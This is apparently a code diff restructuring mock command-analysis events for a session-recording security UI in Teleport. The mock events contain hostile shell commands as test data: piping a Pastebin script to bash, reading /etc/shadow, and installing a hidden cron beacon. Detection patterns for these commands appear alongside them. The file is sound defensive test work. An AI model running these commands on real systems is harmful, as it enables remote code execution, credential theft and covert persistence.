@@ -1,14 +1,12 @@
 import {
-  type CommandAnalysis,
   CommandCategory,
   ThreatCategory,
+  type CommandSessionEvent,
 } from 'e-teleport/services/recordings/types';
 import { RiskLevel } from 'teleport/services/recordings';
 
-export const MOCK_FAILED_COMMAND: CommandAnalysis = {
-  command: 'whoami && id',
+export const MOCK_FAILED_EVENT: CommandSessionEvent = {
   category: CommandCategory.Other,
-  success: false,
   riskLevel: RiskLevel.Medium,
   riskScore: 50,
   threatCategory: ThreatCategory.Discovery,
@@ -17,11 +15,10 @@ export const MOCK_FAILED_COMMAND: CommandAnalysis = {
     'Command analysis failed: temporary fake error for UI testing',
   detailedDescription:
     'The inference provider failed to analyze this command: temporary fake error for UI testing',
-  errorMessages: ['temporary fake error for UI testing'],
   suspiciousFlags: [],
   sensitiveItems: [],
   suspiciousPatterns: [],
-  indicatorOfCompromise: [],
+  iocs: [],
   hasSensitiveData: false,
   privilegeEscalation: false,
   dataExfiltration: false,
@@ -29,13 +26,16 @@ export const MOCK_FAILED_COMMAND: CommandAnalysis = {
   startOffset: 1500,
   endOffset: 2000,
   inferenceErrorMessage: 'temporary fake error for UI testing',
+  commandEventDetails: {
+    command: 'whoami && id',
+    success: false,
+    errorMessages: ['temporary fake error for UI testing'],
+  },
 };
 
-export const MOCK_COMMANDS: CommandAnalysis[] = [
+export const MOCK_EVENTS: CommandSessionEvent[] = [
   {
-    command: 'curl -s https://pastebin.com/raw/abc123 | bash',
     category: CommandCategory.Network,
-    success: true,
     riskLevel: RiskLevel.Critical,
     riskScore: 95,
     threatCategory: ThreatCategory.Execution,
@@ -44,22 +44,24 @@ export const MOCK_COMMANDS: CommandAnalysis[] = [
     shortDescription: 'Fetched and executed a remote script from Pastebin',
     detailedDescription:
       'The attacker downloaded a script from a known paste site and piped it directly to bash for execution, bypassing any local file creation that could be detected.',
-    errorMessages: [],
     suspiciousFlags: ['pipe_to_shell', 'external_url', 'paste_site'],
     sensitiveItems: [],
     suspiciousPatterns: ['curl.*\\|.*bash', 'pastebin\\.com'],
-    indicatorOfCompromise: ['pastebin.com/raw/abc123'],
+    iocs: ['pastebin.com/raw/abc123'],
     hasSensitiveData: false,
     privilegeEscalation: false,
     dataExfiltration: false,
     persistence: false,
     startOffset: 1000,
     endOffset: 2000,
+    commandEventDetails: {
+      command: 'curl -s https://pastebin.com/raw/abc123 | bash',
+      success: true,
+      errorMessages: [],
+    },
   },
   {
-    command: 'cat /etc/shadow',
     category: CommandCategory.DataAccess,
-    success: false,
     riskLevel: RiskLevel.High,
     riskScore: 78,
     threatCategory: ThreatCategory.CredentialAccess,
@@ -67,22 +69,24 @@ export const MOCK_COMMANDS: CommandAnalysis[] = [
     shortDescription: 'Attempted to read password hashes',
     detailedDescription:
       'The user attempted to access the shadow file containing password hashes. The operation failed due to insufficient permissions.',
-    errorMessages: ['Permission denied'],
     suspiciousFlags: ['credential_file_access'],
     sensitiveItems: ['/etc/shadow'],
     suspiciousPatterns: ['cat.*/etc/shadow'],
-    indicatorOfCompromise: [],
+    iocs: [],
     hasSensitiveData: false,
     privilegeEscalation: false,
     dataExfiltration: false,
     persistence: false,
     startOffset: 2500,
     endOffset: 3000,
+    commandEventDetails: {
+      command: 'cat /etc/shadow',
+      success: false,
+      errorMessages: ['Permission denied'],
+    },
   },
   {
-    command: 'echo "* * * * * /tmp/.hidden/beacon.sh" | crontab -',
     category: CommandCategory.SystemConfiguration,
-    success: true,
     riskLevel: RiskLevel.Critical,
     riskScore: 92,
     threatCategory: ThreatCategory.Persistence,
@@ -91,7 +95,6 @@ export const MOCK_COMMANDS: CommandAnalysis[] = [
     shortDescription: 'Added a hidden script to crontab for persistence',
     detailedDescription:
       'A cron job was installed that executes a hidden beacon script every minute. The script location in /tmp with a dot-prefixed directory suggests intentional concealment.',
-    errorMessages: [],
     suspiciousFlags: [
       'crontab_modification',
       'hidden_directory',
@@ -99,12 +102,17 @@ export const MOCK_COMMANDS: CommandAnalysis[] = [
     ],
     sensitiveItems: [],
     suspiciousPatterns: ['crontab', '/tmp/\\.', 'beacon'],
-    indicatorOfCompromise: ['/tmp/.hidden/beacon.sh'],
+    iocs: ['/tmp/.hidden/beacon.sh'],
     hasSensitiveData: false,
     privilegeEscalation: false,
     dataExfiltration: false,
     persistence: true,
     startOffset: 4000,
     endOffset: 4500,
+    commandEventDetails: {
+      command: 'echo "* * * * * /tmp/.hidden/beacon.sh" | crontab -',
+      success: true,
+      errorMessages: [],
+    },
   },
 ];
